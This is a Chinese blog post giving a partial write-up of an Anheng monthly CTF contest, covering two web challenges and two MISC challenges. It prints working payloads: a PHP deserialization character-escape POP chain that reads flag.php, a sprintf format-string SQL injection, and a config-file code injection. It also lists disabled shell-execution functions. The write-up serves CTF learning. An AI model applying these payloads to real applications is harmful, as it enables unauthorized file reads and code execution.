<!DOCTYPE html>
<html lang="zh-CN">










<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="">
    <meta name="author" content="chuddy">
    <meta name="keywords" content="">
    <title>安恒四月赛部分writeup ~ chuddy&#39;s Blog</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
    
        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
    
</head>

<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
    <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
        <div class="container text-center white-text wow fadeInUp">
            <p class="h2">安恒四月赛部分writeup</p>
            <br>
            
            <p>Saturday, April 25th 2020, 10:59 pm</p>
            
        </div>
        </div>
    </div>
    </div>
  </header>

  <main>
  
  <div class="container-fluid">
    <div class="row">
        <div class="col-md-8 offset-md-2 ">
            <div class="post-content py-5 z-depth-3 main">
                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这周有安恒的月赛，<br>又是膜师傅的一天<br>学到了一些骚姿势：</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>打开题目发现给出了源码：</p>
<pre><code> &lt;?php
show_source(&quot;index.php&quot;);
function write($data) {
    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);
}
function read($data) {
    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);
}

class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this-&gt;username = $a;
        $this-&gt;password = $b;
    }
}

class B{
    public $b = &#39;gqy&#39;;
    function __destruct(){
        $c = &#39;a&#39;.$this-&gt;b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this-&gt;c);
        return &#39;nice&#39;;
    }
}

$a = @new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);
//省略了存储序列化数据的过程,下面是取出来并反序列化的操作
$b = unserialize(read(write(serialize($a)))); 
</code></pre><p>我们来分析一下：</p>
<pre><code>function write($data) {
    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);
}

function read($data) {
    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);
}
</code></pre><p>这个写函数，当反序列化存储的私有成员是，会有<code>chr(0)</code>的出现，所以会对<code>chr(0) . &#39;*&#39; . chr(0)</code>进行一个替换，当读取的时候会对<code>\0\0\0</code>进行一个还原。</p>
<p>看似没有什么问题，但是当我们可以的存储<code>\0\0\0</code>进行<code>wirte()</code>时不会发生改变。但是进行<code>read()</code>时，会变为<code>chr(0) . &#39;*&#39; . chr(0)</code>由六字符变为三字符，可以实现字符逃逸。。。</p>
<p>我们可以明显看到在 <code>read</code> 函数处理后，原先字符中的 <code>\0\0\0</code>被替换成 <code>chr(0).&#39;*&#39;.chr(0)</code>，但是字符长度标识不变 。所以在进行反序列化的时候，还会继续向后读取，这样序列化的结果就完全不一样了。</p>
<p>所以来看一下如何构造pop链。</p>
<pre><code>class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this-&gt;username = $a;
        $this-&gt;password = $b;
    }
}

class B{
    public $b = &#39;gqy&#39;;
    function __destruct(){
        $c = &#39;a&#39;.$this-&gt;b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this-&gt;c);
        return &#39;nice&#39;;
    }
}
</code></pre><p><code>class C</code>存在<code>file_get_contents()</code>函数，可以读取文件内容，可以让<code>$c</code>为<code>flag.php</code>,并且存在<code>__toString()</code>魔术方法。。 <code>class B</code>函数存在<code>echo</code> 那么大致思路就出来了</p>
<pre><code> &lt;?php


class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this-&gt;username = $a;
        $this-&gt;password = $b;
    }
}

class B{
    public $b;
    function __destruct(){
        $c = &#39;a&#39;.$this-&gt;b;
        echo $c;
    }
}
class C{
    public $c = &#39;flag.php&#39;;
    function __toString(){
        //flag.php
        echo file_get_contents($this-&gt;c);
        return &#39;nice&#39;;
    }
}

$aaa = new A();
$bbb = new B();
$ccc = new C();
$bbb-&gt;b=$ccc;
// echo serialize($bbb);
$aaa-&gt;password=$bbb;
echo serialize($aaa);
</code></pre><p>得到<code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;N;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></p>
<p>因为要造成反序列化逃逸：所以password值为：<code>&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}</code></p>
<p>带入反序列化的解果为：<code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:3:&quot;aaa&quot;;s:8:&quot;password&quot;;s:72:&quot;&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}&quot;;}</code></p>
<p>所以我们要逃逸的字符为:<code>&quot;;s:8:&quot;password&quot;;s:72:&quot;</code>一共23个字符，但是<code>\0\0\0</code>替换为<code>chr(0) . &#39;*&#39; . chr(0)</code>一次逃逸3个字符，所以要是三的倍数。。所以<code>password</code>为<code>A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}</code><br>username为24个<code>\0</code>;</p>
<p>payload:</p>
<pre><code>a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}
</code></pre><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>打开页面是一个登陆框：<br><img src="https://p0.ssl.qhimg.com/t01bccbf14a14799d67.png" alt=""></p>
<p>尝试一下发现存在waf,<br>于是看一下都过滤了写什么函数。。<br><img src="https://p3.ssl.qhimg.com/t01292dff8c6448865e.png" alt=""></p>
<p>发现过滤的挺多的，也挺全的，一时没有了解头绪</p>
<p>看一下源代码，发现了收获，2333<br><img src="https://p3.ssl.qhimg.com/t019cd7f182040fc1f5.png" alt=""></p>
<p>这个<code>%s</code>让我想到了格式化字符串的漏洞。。<br>上网找到这样的一篇文章<a href="https://www.cnblogs.com/test404/p/7821884.html" target="_blank" rel="noopener">参考文章</a><br>发现骚姿势，SQL注入可以和格式化字符串一起使用</p>
<p>例如：</p>
<pre><code>&lt;?php

$input1 = &#39;%1$c) OR 1 = 1 /*&#39;;
$input2 = 39;
$sql = &quot;SELECT * FROM foo WHERE bar IN (&#39;$input1&#39;) AND baz = %s&quot;;
$sql = sprintf($sql, $input2);
echo $sql;
</code></pre><p>输出为<code>select * from foo where bar in(&#39;&#39;) or 1=1 /*&#39;) and baz=39</code></p>
<p><code>%c</code>起到了类似<code>chr()</code>的效果，将数字39转化为<code>&#39;</code>，从而导致了sql注入。</p>
<p>我们尝试一下利用这种方法</p>
<p><img src="https://p3.ssl.qhimg.com/t01d01d48205a893aab.png" alt=""><br>得到了账户密码</p>
<p>发现是admin用户的密码猜测存在后台，找到了后台的位置<code>/admin</code><br>然后进行登陆，发现，这是一个套娃题 。。 淦<br><img src="https://p2.ssl.qhimg.com/t01e12d111380a43807.png" alt=""></p>
<p>这里面对发现了眼熟的代码：<br><img src="https://p0.ssl.qhimg.com/t0188efbd6d95e4e949.png" alt=""></p>
<p>是一个经典的配置文件写入问题漏洞.<a href="https://www.cnblogs.com/wh4am1/p/6607837.html" target="_blank" rel="noopener">参考链接</a><br>payload:</p>
<pre><code>a\&#39;;phpinfo();//
</code></pre><p>然后再shell.php看到了phpinfo()的界面。。</p>
<p>我以为就可以得到flag了。。谁知道有<code>disable_functions</code></p>
<pre><code>set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,error_log,dl,FFI::cdef,debug_backtrace,imap_mail,mb_send_mail

</code></pre><p>想到了题目给了一个so文件。。猜测是上传so文件来进行提权操作。。。但是尝试了半天无果。。这应该是最后一步了，并且好多人在搅屎</p>
<p>最后两分钟有大佬拿到了一血<br>tql。</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="blueshark"><a href="#blueshark" class="headerlink" title="blueshark"></a>blueshark</h2><p>打开题目，发现这是一个蓝牙协议：<br><img src="https://p0.ssl.qhimg.com/t0119f4fd1685b4c84b.png" alt=""></p>
<p>发现存在一个7z的压缩包。提示压缩包密码为PIN码<br><img src="https://p5.ssl.qhimg.com/t01b64926b431de0244.png" alt=""></p>
<p>一个骚操作将pcap文件后缀改为zip可以得到这个压缩包。。。<br>然后找到了PIN码的流量，得到PIN码</p>
<p><img src="https://p2.ssl.qhimg.com/t01cf12039da7a60674.png" alt=""><br>打开压缩包，得到flag</p>
<h2 id="6G还远吗？"><a href="#6G还远吗？" class="headerlink" title="6G还远吗？"></a>6G还远吗？</h2><p>刚开始发现是下载的779MB的文件，就点击下载了，然后去看别的题目了，但是过一会发现这个下载速度不对呀。。意识到事情有一丝丝的不对。。嘿嘿</p>
<p>暂停下载找到下载的临时文件打开得到了flag<br><img src="https://p1.ssl.qhimg.com/t0117eab44fa41354ad.png" alt=""></p>
<p><img src="https://p4.ssl.qhimg.com/t0150b0a5f9d3bf72cc.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次月赛，学到了一些新知识，以及骚操作</p>
<p>大佬们都tql。。。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/test404/p/7821884.html" target="_blank" rel="noopener">https://www.cnblogs.com/test404/p/7821884.html</a><br><a href="https://www.cnblogs.com/wh4am1/p/6607837.html" target="_blank" rel="noopener">https://www.cnblogs.com/wh4am1/p/6607837.html</a><br><a href="https://xz.aliyun.com/t/6588" target="_blank" rel="noopener">https://xz.aliyun.com/t/6588</a></p>

                <hr>
                <div>
                    <p>
                         
                        <span class="badge badge-light">#&nbsp;writeup</span>
                        &nbsp;
                        
                    </p>
                </div>
                <br>
                
            </div>
        </div>
        <div class="d-none d-md-block col-md-2">
            
  <div id="toc" class="py-5">
    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>        
</div>

<br><br><br>

<!-- Comments -->
<div class="comments" id="comments">
 
</div>
  
  </main>

<footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    
    <script src="/js/post.js"></script>
    
      <script src="/js/plugins/prettify.js"></script>
      <script>
          $(document).ready(function(){
              $('pre').addClass('prettyprint linenums');
              prettyPrint();
          })
      </script>
    
  
</body>
</html>